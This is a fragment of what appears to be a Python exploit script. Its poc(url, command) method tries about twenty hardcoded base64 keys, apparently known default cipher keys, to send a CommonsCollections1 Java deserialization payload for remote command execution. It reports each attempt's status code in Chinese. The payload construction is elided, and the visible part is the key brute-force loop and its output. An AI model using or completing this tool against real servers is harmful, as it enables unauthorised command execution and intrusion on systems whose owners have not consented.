    ...
    def poc(self,url, command):
        ...
        try:
            ...
            if(r.status_code==200):              
                print("[+]   CommonsCollections1模块   key1:kPH+bIxk5D2deZiIxcaaaA== 已成功发送！")
                print("[+]   状态码:"+str(r.status_code))
            else:
                print("[-]   CommonsCollections1模块   key1:kPH+bIxk5D2deZiIxcaaaA== 发送异常！")
                print("[-]   状态码:"+str(r.status_code))
            ...
            if(r2.status_code==200):
                print("[+]   CommonsCollections1模块   key2:wGiHplamyXlVB11UXWol8g== 已成功发送！")
                print("[+]   状态码:"+str(r2.status_code))
            else:
                print("[-]   CommonsCollections1模块   key2:wGiHplamyXlVB11UXWol8g== 发送异常！")
                print("[-]   状态码:"+str(r2.status_code))
            ...
            if(r3.status_code==200):
                print("[+]   CommonsCollections1模块   key3:2AvVhdsgUs0FSA3SDFAdag== 已成功发送！")
                print("[+]   状态码:"+str(r3.status_code))
            else:
                print("[-]   CommonsCollections1模块   key3:2AvVhdsgUs0FSA3SDFAdag== 发送异常！")
                print("[-]   状态码:"+str(r3.status_code))
            ...
            if(r4.status_code==200):
                print("[+]   CommonsCollections1模块   key4:4AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                print("[+]   状态码:"+str(r4.status_code))
            else:
                print("[-]   CommonsCollections1模块   key4:4AvVhmFLUs0KTA3Kprsdag== 发送异常！")
                print("[-]   状态码:"+str(r4.status_code))
            ...
            if(r5.status_code==200):
                print("[+]   CommonsCollections1模块   key5:3AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                print("[+]   状态码:"+str(r5.status_code))
            else:
                print("[-]   CommonsCollections1模块   key5:3AvVhmFLUs0KTA3Kprsdag== 发送异常！")
                print("[-]   状态码:"+str(r5.status_code))
            ...
            if(r6.status_code==200):
                print("[+]   CommonsCollections1模块   key6:Z3VucwAAAAAAAAAAAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r6.status_code))
            else:
                print("[-]   CommonsCollections1模块   key6:Z3VucwAAAAAAAAAAAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r6.status_code))
            ...
            if(r7.status_code==200):
                print("[+]   CommonsCollections1模块   key7:U3ByaW5nQmxhZGUAAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r7.status_code))
            else:
                print("[-]   CommonsCollections1模块   key7:U3ByaW5nQmxhZGUAAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r7.status_code))
            ...
            if(r8.status_code==200):
                print("[+]   CommonsCollections1模块   key8:wGiHplamyXlVB11UXWol8g== 已成功发送！")
                print("[+]   状态码:"+str(r8.status_code))
            else:
                print("[-]   CommonsCollections1模块   key8:wGiHplamyXlVB11UXWol8g== 发送异常！")
                print("[-]   状态码:"+str(r8.status_code))
            ...
            if(r9.status_code==200):
                print("[+]   CommonsCollections1模块   key9:6ZmI6I2j5Y+R5aSn5ZOlAA== 已成功发送！")
                print("[+]   状态码:"+str(r9.status_code))
            else:
                print("[-]   CommonsCollections1模块   key9:6ZmI6I2j5Y+R5aSn5ZOlAA== 发送异常！")
                print("[-]   状态码:"+str(r9.status_code))
        ...
        #分界线
            ...
            if(r100.status_code==200):
                print("[+]   CommonsCollections1模块   key10:fCq+/xW488hMTCD+cmJ3aQ== 已成功发送！")
                print("[+]   状态码:"+str(r100.status_code))
            else:
                print("[-]   CommonsCollections1模块   key10:fCq+/xW488hMTCD+cmJ3aQ== 发送异常！")
                print("[-]   状态码:"+str(r100.status_code))
            ...
            if(r111.status_code==200):
                print("[+]   CommonsCollections1模块   key11:1QWLxg+NYmxraMoxAXu/Iw== 已成功发送！")
                print("[+]   状态码:"+str(r111.status_code))
            else:
                print("[-]   CommonsCollections1模块   key11:1QWLxg+NYmxraMoxAXu/Iw== 发送异常！")
                print("[-]   状态码:"+str(r111.status_code))
            ...
            if(r222.status_code==200):
                print("[+]   CommonsCollections1模块   key12:ZUdsaGJuSmxibVI2ZHc9PQ== 已成功发送！")
                print("[+]   状态码:"+str(r222.status_code))
            else:
                print("[-]   CommonsCollections1模块   key12:ZUdsaGJuSmxibVI2ZHc9PQ== 发送异常！")
                print("[-]   状态码:"+str(r222.status_code))
            ...
            if(r333.status_code==200):
                print("[+]   CommonsCollections1模块   key13:L7RioUULEFhRyxM7a2R/Yg== 已成功发送！")
                print("[+]   状态码:"+str(r333.status_code))
            else:
                print("[-]   CommonsCollections1模块   key13:L7RioUULEFhRyxM7a2R/Yg== 发送异常！")
                print("[-]   状态码:"+str(r333.status_code))
            ...
            if(r444.status_code==200):
                print("[+]   CommonsCollections1模块   key14:r0e3c16IdVkouZgk1TKVMg== 已成功发送！")
                print("[+]   状态码:"+str(r444.status_code))
            else:
                print("[-]   CommonsCollections1模块   key14:r0e3c16IdVkouZgk1TKVMg== 发送异常！")
                print("[-]   状态码:"+str(r444.status_code))
            ...
            if(r666.status_code==200):
                print("[+]   CommonsCollections1模块   key15:5aaC5qKm5oqA5pyvAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r666.status_code))
            else:
                print("[-]   CommonsCollections1模块   key15:5aaC5qKm5oqA5pyvAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r666.status_code))
            ...
            if(r777.status_code==200):
                print("[+]   CommonsCollections1模块   key16:bWluZS1hc3NldC1rZXk6QQ== 已成功发送！")
                print("[+]   状态码:"+str(r777.status_code))
            else:
                print("[-]   CommonsCollections1模块   key16:bWluZS1hc3NldC1rZXk6QQ== 发送异常！")
                print("[-]   状态码:"+str(r777.status_code))
            ...
            if(r888.status_code==200):
                print("[+]   CommonsCollections1模块   key17:a2VlcE9uR29pbmdBbmRGaQ== 已成功发送！")
                print("[+]   状态码:"+str(r888.status_code))
            else:
                print("[-]   CommonsCollections1模块   key17:a2VlcE9uR29pbmdBbmRGaQ== 发送异常！")
                print("[-]   状态码:"+str(r888.status_code))
            ...
            if(r999.status_code==200):
                print("[+]   CommonsCollections1模块   key18:WcfHGU25gNnTxTlmJMeSpw== 已成功发送！")
                print("[+]   状态码:"+str(r999.status_code))
            else:
                print("[-]   CommonsCollections1模块   key18:WcfHGU25gNnTxTlmJMeSpw== 发送异常！")
                print("[-]   状态码:"+str(r999.status_code))
            ...
            if(r_001.status_code==200):
                print("[+]   CommonsCollections1模块   key19:bWljcm9zAAAAAAAAAAAAAA== 已成功发送！")
                print("[+]   状态码:"+str(r_001.status_code))
            else:
                print("[-]   CommonsCollections1模块   key19:bWljcm9zAAAAAAAAAAAAAA== 发送异常！")
                print("[-]   状态码:"+str(r_001.status_code))
            ...
            if(r_002.status_code==200):
                print("[+]   CommonsCollections1模块   key20:MTIzNDU2Nzg5MGFiY2RlZg== 已成功发送！")
                print("[+]   状态码:"+str(r_002.status_code))
            else:
                print("[-]   CommonsCollections1模块   key20:MTIzNDU2Nzg5MGFiY2RlZg== 发送异常！")
                print("[-]   状态码:"+str(r_002.status_code))
            ...
            if(r_003.status_code==200):
                print("[+]   CommonsCollections1模块   key21:5AvVhmFLUs0KTA3Kprsdag== 已成功发送！")
                print("[+]   状态码:"+str(r_003.status_code))
            else:
                print("[-]   CommonsCollections1模块   key21:5AvVhmFLUs0KTA3Kprsdag== 发送异常！")
                print("[-]   状态码:"+str(r_003.status_code))
           #后补编码
